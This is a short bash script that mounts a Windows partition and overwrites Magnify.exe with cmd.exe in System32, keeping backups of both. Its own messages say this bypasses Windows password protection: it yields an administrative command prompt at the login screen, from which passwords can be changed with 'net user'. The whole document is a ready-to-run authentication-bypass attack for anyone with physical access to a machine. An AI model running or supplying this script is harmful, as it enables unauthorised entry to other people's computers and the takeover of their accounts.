#!/bin/bash
echo "This script will exchange magnify.exe with cmd.exe to bypass windows password procetion. By doing this you can get to command prompt with admistrative priveleges and then change the password with a net user command."
echo
echo "This script will require you to type in the path to your 
windows partition, if it's not mounted then the script will mount 
it."
echo
echo "Type in the path to your disk (/dev/sdx): "
read path

echo
echo "Creating directory..."
sleep 1s
mkdir /tmp/windows
sudo mount $path /tmp/windows
echo "Mounting windows partition..."
sleep 1s 
cd /tmp/windows/Windows/System32
echo "Finding cmd.exe..."
sleep 1s
find cmd.exe
sleep 2s
mkdir cmd_backup
cp cmd.exe cmd_backup/
echo 'Creating cmd.exe backup in 
Windows/System32/cmd_backup/...'
sleep 1s
cp Magnify.exe cmd_backup/
echo 'Creating Magnify.exe backup in 
Windows/System32/cmd_backup/...'
sleep 1s
mv cmd.exe Magnify.exe
echo "Renaming cmd to magnify..."
cd
sudo umount /tmp/windows
rmdir /tmp/windows
echo "Doing cleanup..."
sleep 1s
echo "Done"

